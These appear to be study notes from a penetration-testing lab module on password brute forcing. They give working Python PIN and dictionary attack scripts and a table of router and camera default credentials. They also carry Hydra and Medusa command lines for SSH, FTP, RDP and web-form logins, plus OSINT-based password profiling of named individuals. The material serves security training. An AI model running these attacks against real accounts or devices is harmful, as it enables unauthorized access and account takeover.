# BRUTE FORCING

## INTRODUCTION

Trial-and-error against passwords, keys, or credentials until one lands. Success depends on three things: password complexity, attacker compute, defenses in place (lockouts, CAPTCHAs, rate limiting). Flow is always the same loop — generate a candidate, apply it, check the response, repeat until match or exhaustion.

Types worth knowing by name and use case:

```
Simple brute force      every combo in a charset/length range         no prior info, resources to spare
Dictionary attack       precompiled wordlist                          target likely picked a common/weak password
Hybrid attack           dictionary + mutation (append/prepend)        target likely modified a common password
Credential stuffing     leaked creds from breach A tried on service B target reuses passwords across services
Password spraying       few common passwords across MANY usernames    lockout policy forces low-and-slow
Rainbow table           precomputed hash-reversal tables              bulk hash cracking, storage available
Reverse brute force     one password against many usernames           strong suspicion a specific password is reused
Distributed brute force workload split across many machines           target's too complex for one box in reasonable time
```

Where it fits in an engagement: after known-vuln and social-engineering avenues dry up, against weak/absent password policies, or when going straight for a specific high-value account.

## PASSWORD SECURITY FUNDAMENTALS

NIST's current stance: length beats composition rules. Each added character multiplies the keyspace — going from 6 to 8 lowercase-only characters takes you from ~300M combos to ~200B. Complexity (charset size) still matters, just less than raw length. Round out the four pillars with uniqueness (no reuse across accounts) and randomness (no dictionary words, no personal info).

Weaknesses worth checking for during recon: sub-8-char passwords, dictionary words/names, embedded personal info (birthdates, pet names — social media first), reuse across accounts, predictable patterns (`qwerty`, `123456`, `p@ssw0rd`-style leet subs).

Org password policies (min length, composition, expiration, history) cut both ways — badly designed ones just push users toward writing passwords down or doing the incremental-append shuffle (comes back in Hybrid Attacks).

**Default credentials are the actual low-hanging fruit** — often skip brute forcing entirely and just try the known default:

```
Linksys Router          admin / admin
D-Link Router           admin / admin
Netgear Router          admin / password
TP-Link Router          admin / admin
Cisco Router            cisco / cisco
Asus Router             admin / admin
Belkin Router           admin / password
Zyxel Router            admin / 1234
Samsung SmartCam        admin / 4321
Hikvision DVR           admin / 12345
Axis IP Camera          root  / pass
Ubiquiti UniFi AP       ubnt  / ubnt
Canon Printer           admin / admin
Honeywell Thermostat    admin / 1234
Panasonic DVR           admin / 12345
```

Default usernames matter as much as default passwords — a known username (`admin`, `root`) cuts the attack surface in half even after the password's been rotated. SecLists keeps a maintained shortlist: `top-usernames-shortlist.txt`.

## BRUTE FORCE ATTACKS

Keyspace math:

```
Possible Combinations = Character Set Size ^ Password Length
```

```
6 chars, lowercase only               26^6  = 308,915,776
8 chars, lowercase only               26^8  = 208,827,064,576
8 chars, upper+lowercase              52^8  = 53,459,728,531,456
12 chars, upper+lower+digits+symbols  94^12 = 475,920,493,781,698,549,504
```

Cracking time scales with both keyspace and attacker compute — 1M guesses/sec (commodity box) needs ~6.9 years for an 8-char alphanumeric password; 1 trillion guesses/sec (serious cluster) still needs ~15,000 years for a full 12-char ASCII password. That gap is the actual justification for a length-first policy recommendation in a report.

**PIN cracking** — small numeric keyspace, fully exhaustible in seconds:

```python
import requests

ip = "<TARGET_IP>"
port = <PORT>

for pin in range(10000):
    formatted_pin = f"{pin:04d}"
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
    if response.ok and 'flag' in response.json():
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

Generalizes to any small fixed-format keyspace (short PINs, OTP codes) where reaching for Hydra/Medusa would be overkill.

## DICTIONARY ATTACKS

Exploits the fact people pick memorable over secure. Wordlist quality beats raw size — a gaming-community target with a gaming-slang list beats a generic 10M-entry dump.

```
                 Dictionary                     Brute Force
Efficiency       fast, narrow search space       slow, exhaustive
Targeting        tailorable (company, staff)     none
Wins against     weak/common passwords            anything, given enough time
Loses against    strong random passwords          (works eventually, just impractically slow)
```

Wordlists worth knowing:

```
rockyou.txt                                millions of leaked real passwords — default go-to
top-usernames-shortlist.txt                SecLists — common usernames, fast pass
xato-net-10-million-usernames.txt          SecLists — exhaustive username list
2023-200_most_used_passwords.txt           SecLists — small, high hit-rate
Default-Credentials/default-passwords.txt  SecLists — device/software defaults
darkweb2017_top-10000.txt                  SecLists — leaked darkweb passwords, good base for policy-filtering
```

All under SecLists: https://github.com/danielmiessler/SecLists

Scripted dictionary attack:

```python
import requests

ip = "<TARGET_IP>"
port = <PORT>

passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

for password in passwords:
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

## HYBRID ATTACKS

Targets the "Summer2023" → "Summer2023!" → "Summer2024" pattern — forced password rotation almost always produces an append/increment, not a genuinely new password. Flow: dictionary pass first to catch the low-hanging fruit, then mutate the survivors (append digits/symbols, increment years) instead of blind brute-forcing — narrows the search space hard while still covering realistic variation.

**Filtering a wordlist to a known policy** — chain `grep -E`, one policy rule per stage:

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt

grep -E '^.{8,}$' darkweb2017_top-10000.txt > darkweb2017-minlength.txt    # min 8 chars
grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt      # needs uppercase
grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt      # needs lowercase
grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt         # needs a digit
wc -l darkweb2017-number.txt
```

10,000 entries down to ~89 real candidates — brutal reduction, much faster crack against anything with an enforced policy than throwing the raw list at it.

**Credential stuffing** — same root weakness (password reuse), different mechanism: replay leaked `username:password` pairs from breach A against service B (banking, email, social), automated, tuned to mimic normal login behavior to dodge detection. Feeds off the same breach dumps or purpose-built leak databases.

## HYDRA

Fast parallel network login cracker, broadest protocol coverage of the mainstream tools.

```bash
hydra -h                          # confirm install
sudo apt-get -y install hydra     # if missing
```

```bash
hydra [login_options] [password_options] [attack_options] [service_options]
```

```
-l LOGIN / -L FILE     single username / username list
-p PASS / -P FILE      single password / password list
-t TASKS               parallel threads
-f                     stop after first valid hit
-s PORT                non-default port
-v / -V                verbose / very verbose
service://server       target + protocol
```

Services worth knowing:

```
ftp             hydra -l admin -P <WORDLIST> ftp://<IP>
ssh             hydra -l root -P <WORDLIST> ssh://<IP>
http-get/post   hydra -l admin -P <WORDLIST> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
smtp            hydra -l admin -P <WORDLIST> smtp://<IP>
pop3            hydra -l <USER> -P <WORDLIST> pop3://<IP>
imap            hydra -l <USER> -P <WORDLIST> imap://<IP>
mysql           hydra -l root -P <WORDLIST> mysql://<IP>
mssql           hydra -l sa -P <WORDLIST> mssql://<IP>
vnc             hydra -P <WORDLIST> vnc://<IP>
rdp             hydra -l admin -P <WORDLIST> rdp://<IP>
```

Quick reference:

```bash
hydra -L usernames.txt -P passwords.txt www.example.com http-get      # HTTP GET auth
hydra -l root -p toor -M targets.txt ssh                              # same creds, many SSH targets
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp # non-standard port
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"  # login form, status-code success
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 <IP> rdp   # charset-generated instead of a wordlist
```

## BASIC HTTP AUTHENTICATION

Challenge-response over headers, no HTML form involved. Restricted resource → `401 Unauthorized` + `WWW-Authenticate` → browser's native login prompt → `user:pass` base64'd into every subsequent request:

```
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

Known username makes this the easy case — just brute the password:

```bash
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt

hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt <TARGET_IP> http-get / -s <PORT>
```

`http-get /` = protocol + path, `-s` overrides the default port.

## LOGIN FORMS

Custom HTML forms need more setup than Basic Auth — real field names, method, and a defined success/failure signal, none of which Hydra can infer on its own.

```html
<form action="/login" method="post">
  <input type="text" name="username">
  <input type="password" name="password">
  <input type="submit" value="Submit">
</form>
```

becomes on submit:

```
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded

username=john&password=secret123
```

```bash
hydra [options] <TARGET> http-post-form "path:params:condition_string"
```

Condition string tells Hydra how to read success vs failure — use whichever's more reliable against the target:

```
F=<STRING>   fail if this text shows up (e.g. "Invalid credentials") — most common, most reliable
S=<STRING>   succeed if this text shows up (e.g. "Welcome", "Dashboard")
S=302        succeed on this HTTP status (redirect-on-success pattern)
```

**Recon before firing Hydra, not instead of it:**

1. Inspector on the form — exact `method` and `name=` attributes.
2. DevTools Network tab — submit a throwaway login, capture the real request and the actual failure text.
3. Proxy (Burp/ZAP) for anything more involved — hidden fields, tokens, full header visibility.

Params string mirrors the real POST body, `^USER^`/`^PASS^` as Hydra's placeholders. Any hidden field (CSRF token, etc.) has to go in too:

```
/:username=^USER^&password=^PASS^:F=Invalid credentials
```

```bash
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt

hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f <TARGET_IP> -s <PORT> http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

## MEDUSA

Parallel modular login brute-forcer, Hydra's main alternative — similar coverage, different syntax.

```bash
medusa -h                          # confirm install
sudo apt-get -y install medusa
```

```bash
medusa [target_options] [credential_options] -M module [module_options]
```

```
-h HOST / -H FILE      single target / target list
-u USER / -U FILE      single username / username list
-p PASS / -P FILE      single password / password list
-M MODULE              service module (ssh, ftp, http, etc.)
-m "MODULE_OPTION"     module-specific options, quoted
-t TASKS               parallel attempts
-f / -F                stop on first success (this host / any host)
-n PORT                non-default port
-v LEVEL               verbosity, up to 6
```

Modules:

```
ftp        medusa -M ftp -h <IP> -u admin -P <WORDLIST>
http       medusa -M http -h <HOST> -U <USERS> -P <WORDLIST> -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^
imap       medusa -M imap -h <HOST> -U <USERS> -P <WORDLIST>
mysql      medusa -M mysql -h <IP> -u root -P <WORDLIST>
pop3       medusa -M pop3 -h <HOST> -U <USERS> -P <WORDLIST>
rdp        medusa -M rdp -h <IP> -u admin -P <WORDLIST>
ssh        medusa -M ssh -h <IP> -u root -P <WORDLIST>
svn        medusa -M svn -h <IP> -u admin -P <WORDLIST>
telnet     medusa -M telnet -h <IP> -u admin -P <WORDLIST>
vnc        medusa -M vnc -h <IP> -P <WORDLIST>
web-form   medusa -M web-form -h <HOST> -U <USERS> -P <WORDLIST> -m FORM:"username=^USER^&password=^PASS^:F=Invalid"
```

Empty/default-password sweep across a user list:

```bash
medusa -h <IP> -U usernames.txt -e ns -M <SERVICE>
```

`-e n` = try empty password, `-e s` = try password matching username.

## WEB SERVICES

Chaining a cracked SSH login into further recon and a second brute-force target — the actual applied workflow, not just tool syntax.

```bash
medusa -h <IP> -n <PORT> -u <USER> -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

On success:

```bash
ssh <USER>@<IP> -p <PORT>
```

Enumerate from inside for other listening services:

```bash
netstat -tulpn | grep LISTEN
nmap localhost
```

Port 21 open → FTP. Check `/home` for a username hint (an `ftpuser` directory practically hands you the username), then hit it:

```bash
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

Grab the loot:

```bash
ftp ftp://<USER>:<PASSWORD>@localhost
ftp> get flag.txt
```

## CUSTOM WORDLISTS

Generic wordlists (rockyou, xato) miss anything following a specific org's naming convention or a specific person's actual life — worth building targeted lists once there's a named target.

**Username Anarchy** — generates every plausible username permutation from a first/last name (initials, concatenations, truncations, leetspeak-adjacent variants):

```bash
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy -l                              # list available patterns
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

**CUPP (Common User Passwords Profiler)** — turns OSINT into a targeted password list. More input, better hit rate. Mine social media, company bios, public records, and news/blog mentions first.

```bash
sudo apt install cupp -y
cupp -i
```

Prompts: First Name, Surname, Nickname, Birthdate (DDMMYYYY), Partner's name/nickname/birthdate, Child's name/nickname/birthdate, Pet's name, Company name, freeform keywords, then y/[N] toggles for appended special chars, appended numbers, and leetspeak substitution. Output lands in `<name>.txt`, typically tens of thousands of candidates.

Filter the output against a known policy the same way as Hybrid Attacks:

```bash
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

Feed both generated lists straight into Hydra:

```bash
hydra -L jane_smith_usernames.txt -P jane-filtered.txt <TARGET_IP> -s <PORT> -f http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```